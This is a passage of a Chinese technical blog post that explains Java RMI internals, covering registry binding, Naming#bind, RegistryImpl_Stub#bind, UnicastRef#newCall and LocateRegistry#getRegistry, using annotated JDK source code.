说明：对“远程来电”路径，骨架/调度层会先做访问控制校验；</span></span><br><span class="line">    <span class="comment">//       本地同进程直接调用不经过骨架的远程访问检查。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;                <span class="comment">// 以注册表映射为锁，保证并发安全</span></span><br><span class="line">        <span class="comment">// 1) 检查名称是否已被占用</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">        <span class="keyword">if</span> (curr != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 已存在同名条目 → 按规范抛 AlreadyBoundException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 放入映射：名称 → 远程对象（通常是其 stub）</span></span><br><span class="line">        bindings.put(name, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果是使用 <code>Naming#bind</code> 静态方法，则会先调用 <code>getRegistry</code> 获取 RMI URL 对应的注册中心存根 <code>RegistryImpl_Stub</code>，之后和前面的方法一样调用的是 <code>RegistryImpl_Stub</code> 的 <code>bind</code> 方法完成远程对象的注册。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的 &#123;<span class="doctag">@code</span> name&#125; 绑定到远程对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;支持“URL 风格”的名称。常见写法：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> &quot;rmi://host:port/name&quot;&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> &quot;//host:port/name&quot;&#125;（省略协议）&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> &quot;name&quot;&#125;（省略主机与端口，默认本机 + 1099）&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 使用 URL 风格的名称（可省略协议/主机/端口）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  远程对象引用（通常是已导出的 stub；若对象继承 UnicastRemoteObject 且已自动导出也可）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AlreadyBoundException    名称已被占用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> java.net.MalformedURLException 名称格式不合法（例如缺少服务名）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException          无法联系注册中心或网络/序列化错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AccessException          不允许执行该操作（标准实现通常仅允许“本地”进程 bind/rebind/unbind）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK 1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">        <span class="keyword">throws</span> AlreadyBoundException, java.net.MalformedURLException, RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1) 解析名称：拆出 host、port、最终服务名 parsed.name</span></span><br><span class="line">    <span class="comment">//    - 仅有服务名时，默认 host=本机、port=Registry.REGISTRY_PORT(1099)</span></span><br><span class="line">    <span class="type">ParsedNamingURL</span> <span class="variable">parsed</span> <span class="operator">=</span> parseURL(name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 根据解析出的 host/port 获取（远程或本地）Registry 代理</span></span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> getRegistry(parsed);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 空值保护：不能把 null 绑定到名字上</span></span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;cannot bind to null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 发送到注册中心：若名称已存在则抛 AlreadyBoundException</span></span><br><span class="line">    registry.bind(parsed.name, obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>RegistryImpl_Stub#bind</code> 函数实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 客户端存根方法：调用远端注册中心的 &#123;<span class="doctag">@code</span> Registry.bind(String, Remote)&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现细节：方法参数通过 RMI 编组（Java 序列化）写入网络流，</span></span><br><span class="line"><span class="comment"> * 再由底层 &#123;<span class="doctag">@link</span> java.rmi.server.RemoteRef&#125; 发送 JRMP 请求；服务端执行后</span></span><br><span class="line"><span class="comment"> * 返回正常结果（此处为 void）或按声明的受检异常回传并在本地重新抛出。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;方法选择（协议）&lt;/b&gt;：由生成代码中的 &#123;<span class="doctag">@code</span> operations&#125; 表下标（此处为 0，opnum）</span></span><br><span class="line"><span class="comment"> * 与 &#123;<span class="doctag">@code</span> interfaceHash&#125; 共同标识远程方法。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $param_String_1  要绑定的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $param_Remote_2  要绑定的远程对象引用（通常是已导出的 stub）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> java.rmi.AccessException       远程调用方无权执行绑定</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> java.rmi.AlreadyBoundException 指定名称已被占用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> java.rmi.RemoteException       编组/解组或网络 I/O 等远程错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK 1.1 （由 rmic 生成的 *_Stub）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(java.lang.String $param_String_1, java.rmi.Remote $param_Remote_2)</span></span><br><span class="line">        <span class="keyword">throws</span> java.rmi.AccessException, java.rmi.AlreadyBoundException, java.rmi.RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 创建一次远程调用上下文（Call）</span></span><br><span class="line">        <span class="comment">//    - ref：客户端持有的 RemoteRef（封装传输细节与目标地址）</span></span><br><span class="line">        <span class="comment">//    - this：当前 stub 实例（用于定位远端对象）</span></span><br><span class="line">        <span class="comment">//    - operations：本接口的方法表（rmi 生成的 Operation[]）</span></span><br><span class="line">        <span class="comment">//    - 0：方法在表中的序号（opnum），这里 0 对应 bind(String, Remote)</span></span><br><span class="line">        <span class="comment">//    - interfaceHash：接口签名哈希（long），用于版本/方法匹配</span></span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> (StreamRemoteCall) ref.newCall(<span class="built_in">this</span>, operations, <span class="number">0</span>, interfaceHash);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 2) 参数编组（marshalling）：把方法参数写入输出流</span></span><br><span class="line">            <span class="comment">//    RMI 使用 Java 序列化协议传输参数/返回值/异常</span></span><br><span class="line">            java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            out.writeObject($param_String_1);   <span class="comment">// 写入名称</span></span><br><span class="line">            out.writeObject($param_Remote_2);   <span class="comment">// 写入远程对象（通常是其 stub）</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="comment">// 序列化参数失败 → 抛出编组异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 发送请求并等待返回（可能是正常返回，也可能是远端抛出的受检异常）</span></span><br><span class="line">        ref.invoke(call);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 调用完成的清理/收尾（释放流、连接复用等）</span></span><br><span class="line">        ref.done(call);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.RuntimeException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数首先调用 <code>ref.newCall</code> 建立与远程注册中心的连接从而创建一个远程调用对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一次新的远程调用创建并返回“调用上下文”（&#123;<span class="doctag">@link</span> RemoteCall&#125;）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;流程与用途：</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;从 &#123;<span class="doctag">@code</span> ref&#125; 的通道获取一条连接（可能复用连接池）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;记录本次调用的元信息（用于调试/日志）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;基于连接、目标对象 ID（ObjID）、方法序号（opnum）与接口签名哈希（hash）</span></span><br><span class="line"><span class="comment"> *       构造 &#123;<span class="doctag">@link</span> StreamRemoteCall&#125;，作为本次 JRMP 调用的承载体。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;序列化“自定义调用数据”（若实现覆盖了 &#123;<span class="doctag">@code</span> marshalCustomCallData&#125;）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;把构造好的 &#123;<span class="doctag">@code</span> RemoteCall&#125; 返回给上层（通常是 *_Stub 或</span></span><br><span class="line"><span class="comment"> *       &#123;<span class="doctag">@code</span> RemoteObjectInvocationHandler&#125;），由上层继续写入参数并调用</span></span><br><span class="line"><span class="comment"> *       &#123;<span class="doctag">@code</span> ref.invoke(call)&#125; 发送请求，最后 &#123;<span class="doctag">@code</span> ref.done(call)&#125; 收尾。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;参数说明&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> obj&#125;：当前要调用的远程对象存根（用于日志/定位）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> ops&#125;：编译期/生成器（rmic）产出的“方法表”。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> opnum&#125;：方法在 &#123;<span class="doctag">@code</span> ops&#125; 中的序号（operation number），用于协议层标识具体方法。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> hash&#125;：接口签名哈希（64 位 long）。JRMP 通过它与 &#123;<span class="doctag">@code</span> opnum&#125;</span></span><br><span class="line"><span class="comment"> *       共同校验/选择远端方法，避免版本不匹配。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;异常与资源&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 发生 &#123;<span class="doctag">@link</span> RemoteException&#125; 时会释放本次获取的连接（不复用）。返回正常时，</span></span><br><span class="line"><span class="comment"> * 连接的释放与复用由后续的 &#123;<span class="doctag">@code</span> ref.invoke(call)&#125; / &#123;<span class="doctag">@code</span> ref.done(call)&#125; 负责。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj   远程对象（存根）本体，用于日志等</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ops   方法表（用于定位/记录本次调用的方法）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> opnum 方法序号（在方法表中的下标）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> hash  接口签名哈希（RMI 方法选择/校验用）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 本次调用的 &#123;<span class="doctag">@link</span> RemoteCall&#125;，上层据此写参数并发起调用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 建立连接、构造调用、序列化自定义数据等出错时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> RemoteCall <span class="title function_">newCall</span><span class="params">(RemoteObject obj, Operation[] ops, <span class="type">int</span> opnum, <span class="type">long</span> hash)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    clientRefLog.log(Log.BRIEF, <span class="string">&quot;get connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 向通道申请一条连接（可能是新建，也可能是池中复用）</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ref.getChannel().newConnection();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">&quot;create call context&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 记录本次要调用的方法（便于调试定位）</span></span><br><span class="line">        <span class="keyword">if</span> (clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            logClientCall(obj, ops[opnum]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 基于连接与协议元信息创建 JRMP 调用体</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), opnum, hash);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 序列化“自定义调用数据”（如有定义；默认可能为空实现）</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            marshalCustomCallData(call.getOutputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// 自定义数据编组失败：提升为 RMI 的编组异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshaling custom call data&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 返回给上层；随后由上层写入方法参数并调用 ref.invoke(call)/ref.done(call)</span></span><br><span class="line">        <span class="keyword">return</span> call;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="comment">// 发生远程层错误：当前连接不再复用，立刻释放</span></span><br><span class="line">        ref.getChannel().free(conn, <span class="comment">/*reuse=*/</span><span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>StreamRemoteCall</code> 创建远程调用对象时会写入如下内容用以为被调用方提供方法调用的相关信息。</p>
<ul>
<li>操作码 <code>opnum</code>（<code>bind/0</code>，<code>list/1</code>，<code>lookup/2</code> 对应不同的 <code>opnum</code>），</li>
<li>对象 id（<code>ref.getObjID()</code>，用来描述对象类型）<ul>
<li>对于 <code>RegistryImpl_Stub</code>，这里就是 0。</li>
<li>对于普通远程对象的动态代理 <code>Stub</code>，这里就是其对应的 id。</li>
</ul>
</li>
</ul>
<p>之后在 <code>RegistryImpl_Stub#bind</code> 会将远程对象及其名称序列化后写入输出流，最后调用<code>UnicastRef</code>的 <code>invoke</code> 方法（<code>invoke</code> 会调用 <code>StreamRemoteCall#executeCall</code>，释放输出流，调用远程方法，将结果写进输入流）传给注册中心。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2) 参数编组（marshalling）：把方法参数写入输出流</span></span><br><span class="line"><span class="comment">//    RMI 使用 Java 序列化协议传输参数/返回值/异常</span></span><br><span class="line">java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">out.writeObject($param_String_1);   <span class="comment">// 写入名称</span></span><br><span class="line">out.writeObject($param_Remote_2);   <span class="comment">// 写入远程对象（通常是其 stub）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3) 发送请求并等待返回（可能是正常返回，也可能是远端抛出的受检异常）</span></span><br><span class="line">ref.invoke(call);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) 调用完成的清理/收尾（释放流、连接复用等）</span></span><br><span class="line">ref.done(call);</span><br></pre></td></tr></table></figure></div>

<p>总结一下将远程对象注册到服务中心时的关键点：</p>
<ul>
<li>一般注册中心和服务端都在一起，可直接调用 <code>createRegistry</code> 返回的<code>RegistryImpl#bind</code>，也可以用 <code>Naming#bind</code>。</li>
<li><code>Naming#bind</code> 是通过 <code>RegistryImpl_Stub</code> 将服务名称和远程对象的动态代理 Stub 序列化后传递给注册中心，注册中心再进行 <code>RegistryImpl#bind</code>。</li>
</ul>
<h3 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h3><p>服务发现，就是获取注册中心并对其进行操作的过程。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>关于服务发现，对于服务端来说：</p>
<ul>
<li><p>当服务端和注册中心不在同一端的时候，服务端也会使用 <code>Naming#bind</code> 静态方法注册远程对象。</p>
</li>
<li><p>如果服务端和注册中心在同一端，则可以直接使用创建的注册中心对象 <code>RegistryImpl</code> 的 <code>bind</code> 方法直接将远程对象注册到注册中心。</p>
</li>
</ul>
<p>其中第一种情况其本质是通过 <code>getRegistry</code> 方法获取注册中心，然后再将远程对注册到注册中心中。 这个过程就是服务发现。</p>
<p>而对于客户端，我们调用远程方法之前的第一件事情就是调用 <code>getRegistry</code> 方法获取注册中心，因此同样会涉及服务发现。</p>

    </div>
  </div>

<h4 id="客户端-服务端部分"><a href="#客户端-服务端部分" class="headerlink" title="客户端&#x2F;服务端部分"></a>客户端&#x2F;服务端部分</h4><p>首先是获取注册中心：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>getRegistry</code> 函数实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回指定主机与端口上的远程注册表（Registry）的引用。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;此重载使用“默认客户端 Socket 工厂”（即不自定义 csf）。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;重要：&lt;/b&gt;&#123;<span class="doctag">@code</span> getRegistry&#125; 仅构造并返回一个“本地代理（stub）”，</span></span><br><span class="line"><span class="comment"> * 不会在此时与远端建立连接或做连通性校验；只有在后续调用</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> lookup/bind/rebind/list/unbind&#125; 等方法时才会尝试连接远端并抛出网络相关异常。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> host 远程注册表主机；为 &#123;<span class="doctag">@code</span> null&#125; 或空串则视为本机</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 远程注册表端口；小于等于 0 则采用默认端口 &#123;<span class="doctag">@link</span> #REGISTRY_PORT&#125;（1099）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 远程注册表的引用（stub）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 构造引用失败时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK 1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 调用带 csf 的重载，传入 null 表示使用默认客户端 Socket 工厂</span></span><br><span class="line">    <span class="keyword">return</span> getRegistry(host, port, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** RMI 注册中心的默认端口（习惯值 1099）。 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">REGISTRY_PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回指定主机与端口上的远程注册表（Registry）的引用（stub）。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;与该注册表的通信将通过提供的 &#123;<span class="doctag">@link</span> RMIClientSocketFactory&#125;（csf）创建 Socket 连接；</span></span><br><span class="line"><span class="comment"> * 若 &#123;<span class="doctag">@code</span> csf&#125; 为 &#123;<span class="doctag">@code</span> null&#125;，则使用默认的客户端 Socket 工厂。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;注意：&lt;/b&gt;本方法同样不会立即建立网络连接，真正的连接与远端交互发生在</span></span><br><span class="line"><span class="comment"> * 后续对返回对象调用 Registry 接口方法时。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> host 远程注册表主机；为 &#123;<span class="doctag">@code</span> null&#125; 或空串则回退为本机地址</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 远程注册表端口；小于等于 0 则采用 &#123;<span class="doctag">@link</span> #REGISTRY_PORT&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> csf  客户端 Socket 工厂；为 &#123;<span class="doctag">@code</span> null&#125; 使用默认实现</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 远程注册表的引用（stub）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 构造引用失败时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.2</span></span><br><span 